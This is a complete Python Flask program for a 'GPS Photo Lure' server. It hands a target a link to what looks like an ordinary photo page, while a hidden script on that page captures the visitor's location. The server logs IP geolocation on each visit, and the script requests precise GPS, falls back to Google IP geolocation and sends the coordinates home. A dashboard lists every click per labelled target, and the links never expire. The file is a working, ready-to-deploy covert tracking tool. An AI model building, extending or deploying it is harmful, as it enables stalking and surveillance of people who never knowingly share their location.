#!/usr/bin/env python3
"""
GPS Photo Lure Server v3
- Visible photo decoy page (the lure)
- 3-layer silent capture on EVERY visit:
    1. Server-side IP geolocation (always, no permission, no keys)
    2. Google Geolocation API via IP (optional key, no permission)
    3. GPS via navigator.geolocation (prompt on first visit, silent after)
- Links never expire. Every click is logged with all coordinates.
"""

import os
import sys
import json
import uuid
import time
import base64
import logging
import argparse
import threading
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

from flask import Flask, request, render_template_string, jsonify, redirect, url_for

# ---------------------------------------------------------------------------
# Config
# ---------------------------------------------------------------------------
DEFAULT_PORT = 5000
DEFAULT_HOST = "0.0.0.0"
GOOGLE_GEO_KEY = os.environ.get("GOOGLE_GEO_KEY", "")   # optional, for Layer 2

# In-memory storage
links = {}
captures = []
links_lock = threading.Lock()
captures_lock = threading.Lock()

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s",
                    datefmt="%Y-%m-%d %H:%M:%S")
log = logging.getLogger("gps-lure")

app = Flask(__name__)

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def client_ip():
    """Get real client IP, respecting reverse proxies (Heroku/Render/Nginx)."""
    fwd = request.headers.get("X-Forwarded-For", "")
    if fwd:
        return fwd.split(",")[0].strip()
    return request.remote_addr or "0.0.0.0"


IP_GEO_CACHE = {}

def ip_geolocate(ip):
    """Silent server-side IP geolocation. Tries free HTTPS APIs, caches per IP."""
    if ip in IP_GEO_CACHE:
        return IP_GEO_CACHE[ip]

    result = None
    for url in (
        f"https://ipwho.is/{ip}",
        f"https://ipapi.co/{ip}/json/",
    ):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=4) as resp:
                data = json.loads(resp.read().decode())
            lat = data.get("latitude") or data.get("lat")
            lng = data.get("longitude") or data.get("lon")
            if lat is not None and lng is not None:
                result = {
                    "ip": ip,
                    "lat": lat,
                    "lng": lng,
                    "city": data.get("city", ""),
                    "region": data.get("region", "") or data.get("region_name", ""),
                    "country": data.get("country", "") or data.get("country_name", ""),
                    "accuracy_m": 5000,  # IP-based estimate
                }
                break
        except Exception:
            continue

    IP_GEO_CACHE[ip] = result
    if result:
        log.info("IP geo %s -> %s, %s (%.4f, %.4f)",
                 ip, result["city"], result["country"], result["lat"], result["lng"])
    return result


def new_visit(link_id, ip, geo):
    """Build a fresh visit record."""
    return {
        "visit": None,  # set by caller
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "ip": ip,
        "user_agent": request.headers.get("User-Agent", ""),
        "referer": request.headers.get("Referer", ""),
        # Layer 1 — always present
        "ip_lat": geo["lat"] if geo else None,
        "ip_lng": geo["lng"] if geo else None,
        "ip_city": geo["city"] if geo else None,
        "ip_country": geo["country"] if geo else None,
        # Layer 3 — GPS (best accuracy)
        "gps_lat": None,
        "gps_lng": None,
        "gps_accuracy": None,
        "gps_error": None,
        "gps_source": None,
        "gps_captured_at": None,
    }

# ---------------------------------------------------------------------------
# Stealth template — VISIBLE PHOTO PAGE (the lure)
# ---------------------------------------------------------------------------
STEALTH_TEMPLATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Photo</title>
<style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { background:#000; display:flex; align-items:center; justify-content:center;
           min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; padding:10px; }
    .photo-container { max-width:100%; max-height:95vh; border-radius:12px; overflow:hidden;
                       box-shadow:0 4px 30px rgba(255,255,255,.15); background:#111; }
    .photo-container img { display:block; max-width:100%; max-height:90vh; width:auto; height:auto; object-fit:contain; }
    .loading { color:#888; font-size:14px; padding:40px; text-align:center; }
    .status-bar { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,.7);
                  color:#555; font-size:11px; padding:4px 12px; text-align:center; }
</style>
</head>
<body>
    <div class="photo-container">
        {% if photo_b64 %}
        <img src="data:image/{{ img_type }};base64,{{ photo_b64 }}" alt="Photo">
        {% else %}
        <div class="loading">No image available</div>
        {% endif %}
    </div>
    <div class="status-bar">Photo &bull; view {{ visit_num }}</div>

<script>
(function() {
    var LINK_ID = "{{ link_id }}";
    var VISIT   = {{ visit_num }};
    var GOOGLE_KEY = "{{ google_key }}";
    var sent = false;

    function send(lat, lng, acc, err, source) {
        if (sent) return; sent = true;
        var payload = {
            link_id: LINK_ID, visit: VISIT,
            latitude: lat, longitude: lng, accuracy: acc, error: err, source: source,
            user_agent: navigator.userAgent,
            timestamp_iso: new Date().toISOString()
        };
        try {
            fetch('/capture', { method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify(payload), keepalive:true }).catch(function(){});
        } catch(e) {}
    }

    // Layer 3: GPS — silent if previously granted, otherwise triggers browser prompt
    function tryGPS() {
        var gpsDone = false;
        if (!navigator.geolocation) { fallback('geolocation unsupported'); return; }
        navigator.geolocation.getCurrentPosition(
            function(pos) {
                gpsDone = true;
                send(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy, null, 'gps');
            },
            function(err) {
                gpsDone = true;
                fallback(err && err.message ? err.message : 'permission denied');
            },
            { enableHighAccuracy:true, timeout:8000, maximumAge:0 }
        );
        setTimeout(function(){ if (!gpsDone) fallback('gps timeout'); }, 9000);
    }

    // Layer 2: Google Geolocation API (IP-based, silent) as backup
    function fallback(err) {
        if (GOOGLE_KEY) {
            fetch('https://www.googleapis.com/geolocation/v1/geolocate?key=' + GOOGLE_KEY, {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ considerIp:true })
            }).then(function(r){ return r.json(); }).then(function(d){
                if (d && d.location) send(d.location.lat, d.location.lng, d.accuracy, err || null, 'google-ip');
                else send(null, null, null, err || 'no location', 'none');
            }).catch(function(){ send(null, null, null, err || 'google failed', 'none'); });
        } else {
            send(null, null, null, err || 'denied', 'none');   // IP coords already recorded server-side
        }
    }

    setTimeout(tryGPS, 300);   // fire on every single page load
})();
</script>
</body>
</html>"""

# ---------------------------------------------------------------------------
# Routes
# ---------------------------------------------------------------------------

@app.route("/")
def index():
    return """
    <!DOCTYPE html><html><head><title>GPS Lure — Link Manager</title></head>
    <body style="font-family:sans-serif;padding:20px;background:#111;color:#eee;">
        <h1>GPS Photo Lure v3</h1>
        <p>Photo decoy + silent 3-layer capture. Links never expire. Every click logged.</p>
        <form action="/create" method="post" enctype="multipart/form-data" style="margin-top:20px;">
            <label>Upload lure photo:</label><br>
            <input type="file" name="photo" accept="image/*" style="margin:10px 0;"><br>
            <label>Label / notes:</label><br>
            <input type="text" name="label" placeholder="e.g. Target Alpha" style="width:300px;padding:6px;margin:10px 0;"><br>
            <button type="submit" style="padding:10px 24px;background:#2a7;color:#fff;border:none;border-radius:6px;cursor:pointer;">Generate Tracking Link</button>
        </form>
        <hr style="border-color:#333;margin-top:30px;">
        <h2>Active Links</h2>
        <div id="links">Loading...</div>
        <script>
        function loadLinks(){
            fetch('/links').then(r=>r.json()).then(function(data){
                var h='<table border="1" style="border-collapse:collapse;width:100%;border-color:#333;">';
                h+='<tr style="background:#222;"><th>Created</th><th>Label</th><th>URL</th><th>Visits</th><th>GPS</th><th>IP</th><th></th></tr>';
                data.links.forEach(function(l){
                    var url=window.location.origin+'/l/'+l.id;
                    h+='<tr><td style="padding:6px;">'+l.created+'</td><td style="padding:6px;">'+(l.label||'-')+'</td>'
                      +'<td style="padding:6px;"><code style="font-size:12px;">'+url+'</code></td>'
                      +'<td style="padding:6px;text-align:center;">'+l.visits+'</td>'
                      +'<td style="padding:6px;text-align:center;">'+l.gps+'</td>'
                      +'<td style="padding:6px;text-align:center;">'+l.ip+'</td>'
                      +'<td style="padding:6px;"><a href="/results/'+l.id+'" style="color:#4af;">Results</a></td></tr>';
                });
                document.getElementById('links').innerHTML=h+='</table>';
            });
        }
        loadLinks(); setInterval(loadLinks,5000);
        </script>
    </body></html>"""


@app.route("/create", methods=["POST"])
def create_link():
    label = request.form.get("label", "").strip()
    photo = request.files.get("photo")
    photo_b64, img_type = None, "jpeg"
    if photo and photo.filename:
        raw = photo.read()
        if raw:
            photo_b64 = base64.b64encode(raw).decode()
            ext = Path(photo.filename).suffix.lower()
            if ext == ".png":  img_type = "png"
            elif ext == ".gif": img_type = "gif"
            elif ext == ".webp": img_type = "webp"

    link_id = uuid.uuid4().hex[:12]
    with links_lock:
        links[link_id] = {
            "id": link_id,
            "created": datetime.now(timezone.utc).isoformat(),
            "label": label or None,
            "photo_b64": photo_b64,
            "img_type": img_type,
            "visits": [],            # every click, forever
        }
    log.info("Created link %s (label=%s, photo=%s)", link_id, label, bool(photo_b64))
    return redirect(url_for("index"))


@app.route("/l/<link_id>")
def serve_lure(link_id):
    with links_lock:
        link = links.get(link_id)
        if not link:
            return "<h1>Not found</h1>", 404

    ip = client_ip()
    geo = ip_geolocate(ip)          # Layer 1 — silent, always

    with links_lock:
        visit = new_visit(link_id, ip, geo)
        visit["visit"] = len(link["visits"]) + 1
        link["visits"].append(visit)

    log.info("Link %s visit #%s from %s", link_id, visit["visit"], ip)

    return render_template_string(
        STEALTH_TEMPLATE,
        link_id=link_id,
        visit_num=visit["visit"],
        photo_b64=link["photo_b64"],
        img_type=link["img_type"],
        google_key=GOOGLE_GEO_KEY,
    )


@app.route("/capture", methods=["POST"])
def capture_gps():
    data = request.get_json(silent=True) or {}
    link_id = data.get("link_id")
    if not link_id:
        return jsonify({"status": "missing link_id"}), 400

    with links_lock:
        link = links.get(link_id)
        if not link:
            return jsonify({"status": "link not found"}), 404
        for v in link["visits"]:
            if v["visit"] == data.get("visit"):
                src = data.get("source")
                if src == "gps":
                    v["gps_lat"] = data.get("latitude")
                    v["gps_lng"] = data.get("longitude")
                    v["gps_accuracy"] = data.get("accuracy")
                    v["gps_error"] = data.get("error")
                    v["gps_source"] = "gps"
                    v["gps_captured_at"] = data.get("timestamp_iso")
                elif src == "google-ip":
                    # Keep GPS layer fields; store Google result separately (already have IP layer)
                    v["gps_lat"] = data.get("latitude")
                    v["gps_lng"] = data.get("longitude")
                    v["gps_accuracy"] = data.get("accuracy")
                    v["gps_error"] = data.get("error")
                    v["gps_source"] = "google-ip"
                    v["gps_captured_at"] = data.get("timestamp_iso")
                if data.get("user_agent"):
                    v["user_agent"] = data["user_agent"]
                break

    with captures_lock:
        captures.append(data)

    if data.get("latitude") is not None:
        log.info("CAPTURE link %s visit #%s via %s: %.5f, %.5f (acc=%.0fm)",
                 link_id, data.get("visit"), data.get("source", "?"),
                 data["latitude"], data["longitude"], data.get("accuracy") or 0)
    return jsonify({"status": "ok"})


@app.route("/results/<link_id>")
def show_results(link_id):
    import copy
    with links_lock:
        link = links.get(link_id)
        if not link:
            return "<h1>Not found</h1>", 404
        link_data = copy.deepcopy(link)

    rows = ""
    for v in link_data["visits"]:
        gps_ok = v["gps_lat"] is not None
        ip_ok = v["ip_lat"] is not None
        cls = "success" if gps_ok else ("pending" if ip_ok else "fail")
        rows += f"""
        <tr class="{cls}">
            <td>{v['visit']}</td>
            <td>{v['timestamp']}</td>
            <td>{v['ip']}</td>
            <td>{f'{v["gps_lat"]:.5f}' if gps_ok else '-'}</td>
            <td>{f'{v["gps_lng"]:.5f}' if gps_ok else '-'}</td>
            <td>{f'{v["gps_accuracy"]:.0f}m' if v.get('gps_accuracy') else '-'}</td>
            <td>{v.get('gps_source') or '-'}</td>
            <td>{f'{v["ip_lat"]:.4f}' if ip_ok else '-'}</td>
            <td>{f'{v["ip_lng"]:.4f}' if ip_ok else '-'}</td>
            <td>{v.get('ip_city','') or '-'} {v.get('ip_country','') or ''}</td>
            <td style="font-size:11px;">{(v.get('user_agent') or '')[:50]}</td>
        </tr>"""

    html = f"""
    <!DOCTYPE html><html><head><title>Results — {link_id}</title>
    <style>
        body {{ font-family:sans-serif; background:#111; color:#eee; padding:20px; }}
        table {{ border-collapse:collapse; width:100%; }}
        th,td {{ padding:7px; text-align:left; border-bottom:1px solid #333; font-size:13px; }}
        th {{ background:#222; }}
        .success {{ color:#4c4; }} .pending {{ color:#aa0; }} .fail {{ color:#c44; }}
        pre {{ background:#1a1a1a; padding:10px; border-radius:5px; overflow-x:auto; }}
        a {{ color:#4af; }}
    </style></head><body>
        <h1>Link Results</h1>
        <p><strong>ID:</strong> {link_id} &nbsp; <strong>Label:</strong> {link_data['label'] or '(none)'}</p>
        <p><strong>Created:</strong> {link_data['created']} &nbsp; <strong>Visits:</strong> {len(link_data['visits'])}
           &nbsp; <strong>GPS hits:</strong> {sum(1 for v in link_data['visits'] if v['gps_lat'] is not None)}
           &nbsp; <strong>IP hits:</strong> {sum(1 for v in link_data['visits'] if v['ip_lat'] is not None)}</p>
        <p><strong>Tracking URL:</strong> <code>{request.host_url.strip('/')}/l/{link_id}</code></p>
        <table>
        <tr><th>#</th><th>Time</th><th>IP</th><th>GPS lat</th><th>GPS lng</th><th>Acc</th><th>Src</th>
            <th>IP lat</th><th>IP lng</th><th>City</th><th>User-Agent</th></tr>
        {rows}
        </table>
        <hr style="border-color:#333;margin-top:20px;">
        <h2>Raw JSON</h2>
        <pre>{json.dumps(link_data, indent=2, default=str)}</pre>
    </body></html>"""
    return html


@app.route("/links")
def list_links():
    with links_lock:
        result = [{
            "id": l["id"], "created": l["created"], "label": l["label"],
            "visits": len(l["visits"]),
            "gps": sum(1 for v in l["visits"] if v["gps_lat"] is not None),
            "ip":  sum(1 for v in l["visits"] if v["ip_lat"] is not None),
        } for l in links.values()]
    return jsonify({"links": result, "total": len(result)})


@app.route("/all-captures")
def all_captures():
    with captures_lock:
        return jsonify({"captures": captures, "total": len(captures)})


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description="GPS Photo Lure Server v3")
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    log.info("=" * 60)
    log.info("GPS Photo Lure Server v3")
    log.info("Listening on http://%s:%d", args.host, args.port)
    log.info("Links: unlimited lifetime | Every click captured | 3-layer capture")
    log.info("Layer1=IP(always) Layer2=Google-IP(if key) Layer3=GPS(silent after 1st grant)")
    log.info("=" * 60)
    app.run(host=args.host, port=args.port, debug=args.debug)


if __name__ == "__main__":
    main()
